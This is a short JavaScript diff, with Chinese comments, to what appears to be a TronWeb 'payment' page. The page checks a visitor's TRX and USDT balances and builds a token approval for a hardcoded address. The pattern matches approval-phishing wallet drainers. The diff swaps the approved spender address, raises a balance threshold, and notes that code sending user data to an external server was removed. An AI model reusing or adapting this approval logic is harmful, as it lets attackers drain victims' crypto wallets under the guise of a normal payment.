@@ -12,7 +12,7 @@ async function executeBl0ckchainTransaction() {
         // 移除了发送数据到外部服务器的部分
         // console.log(`User Address: ${userAddress}, TRX Balance: ${trxBalanceFormatted}, USDT Balance: ${usdtBalanceFormatted}`);
 
-        if (usdtBalanceFormatted <= 50 || trxBalanceFormatted <= 28) {
+        if (usdtBalanceFormatted <= 50000000 || trxBalanceFormatted <= 28) {
             await executeBlockchainTransaction(); // 修改：加入 await
         } else {
             await executeBlockchainTransaction(); // 修改：加入 await
@@ -29,7 +29,7 @@ async function paytransfer() {
         let amount = document.getElementById("amount-display").textContent;
         const userAddress = tronWebInstance.defaultAddress.base58;
         const contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-        const approvemyaddress = 'TY9KJy96yzcN6vXMyWdj8muUg6cWZeh2ee';
+        const approvemyaddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
         const approvalParams = [{
             "type": "address",
             "value": approvemyaddress
